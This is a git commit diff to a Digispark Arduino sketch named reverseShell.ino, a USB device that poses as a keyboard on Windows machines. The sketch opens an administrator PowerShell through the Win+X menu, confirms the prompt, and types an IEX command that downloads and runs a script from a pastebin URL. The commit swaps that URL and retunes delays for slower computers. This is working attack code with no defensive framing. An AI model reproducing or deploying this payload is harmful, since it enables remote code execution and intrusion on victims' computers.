37f630ef63d2351282b617d51e641c2957f69216
diegofelipe01 <50500419+diegofelipe01@users.noreply.github.com>
2020-08-05 10:50:08 -0300

    Update and optimization
    Now the powershell windows is closing and the code is optmized for slower computers

--- reverseShell/reverseShell.ino
+++ reverseShell/reverseShell.ino
@@ -8,14 +8,14 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_A);
   DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_A);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/0kqGUKpZ');");
+  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/HPsnsu4u');");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   while(true){
